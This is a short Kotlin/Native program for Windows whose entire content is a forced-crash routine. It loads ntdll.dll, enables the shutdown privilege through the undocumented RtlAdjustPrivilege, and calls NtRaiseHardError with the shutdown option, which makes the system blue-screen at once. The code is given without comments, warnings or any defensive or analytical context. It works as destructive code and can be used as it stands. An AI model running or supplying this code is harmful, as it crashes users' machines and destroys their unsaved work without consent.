import kotlinx.cinterop.*
import platform.windows.*

fun main() {
    memScoped {
        val enabled = alloc<BOOLEANVar>()
        val response = alloc<ULONGVar>()
        
        val ntdll = LoadLibraryA!!("ntdll.dll")
        
        val rtlAdjustPrivilege = GetProcAddress!!(ntdll, "RtlAdjustPrivilege")!!
            .reinterpret<CFunction<(ULONG, BOOLEAN, BOOLEAN, CPointer<BOOLEANVar>) -> NTSTATUS>>()
        
        val ntRaiseHardError = GetProcAddress!!(ntdll, "NtRaiseHardError")!!
            .reinterpret<CFunction<(NTSTATUS, ULONG, ULONG, COpaquePointer?, ULONG, CPointer<ULONGVar>) -> NTSTATUS>>()
        
        rtlAdjustPrivilege(19u, 1u.toUByte(), 0u.toUByte(), enabled.ptr)
        ntRaiseHardError(0xC0000420u.toInt(), 0u, 0u, null, 6u, response.ptr)
    }
}

